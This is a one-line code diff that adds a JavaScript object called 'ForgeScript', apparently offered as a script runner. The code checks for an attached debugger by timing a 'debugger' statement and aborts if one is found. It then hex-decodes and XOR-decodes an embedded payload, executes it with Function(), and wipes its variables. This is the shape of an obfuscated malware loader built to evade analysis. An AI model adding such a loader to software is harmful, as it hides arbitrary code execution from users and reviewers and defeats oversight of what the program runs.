@@ -1,0 +1,1 @@
+var ForgeScript={version:1,run:function(t){var p=t.indexOf("\n");if(p<0||t.slice(0,p)!=="FS:1")return null;var a=Date.now();debugger;if(Date.now()-a>100)return null;var h=t.slice(p+1).replace(/\s+/g,""),s="",i=0;for(;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16)^90);try{return Function(s)();}finally{s="";h="";t="";}}};
